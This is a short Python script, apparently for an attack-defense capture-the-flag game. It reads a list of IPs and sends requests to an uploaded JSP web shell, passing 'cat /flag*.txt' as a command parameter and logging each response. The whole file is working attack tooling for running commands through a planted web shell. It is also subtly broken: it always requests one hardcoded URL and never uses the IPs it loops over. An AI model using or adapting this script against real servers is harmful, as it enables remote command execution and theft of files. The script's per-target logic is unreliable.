import requests

def main():
    with open('./ip.txt') as fopen:
        ip_lists = fopen.readlines()
        ip_list = list(map(lambda ip_temp : ip_temp.replace('\n', '').replace('\r', ''), ip_lists))
        path = "http://172.20.111.102:7001/web2/uploads/6dfb7b3e-0527-4d94-af0d-e73ff93764d5.jsp"
        #path = "web2/uploads/.test.jsp"
        port = "7001"
        params = {"threedr3am":"cat  /flag*.txt"}
        result = open("result.txt", "w")
        with open("./error.txt", "w") as fopen:
            for ip in ip_list:
                try:
                    url = "{0}".format(path)
                    response = requests.get(url, params, timeout=5)
                    print("{0} >> {1}".format(ip, response.text))
                    result.write("{0} >> {1}\n".format(ip, response.text))
                except Exception as e:
                    print("{0} >>...<< {1}".format(ip, "failed"))
                    fopen.write("{0}\n{1}\n\n".format(ip, e))
        result.close()
             
if __name__ == "__main__":
    main()
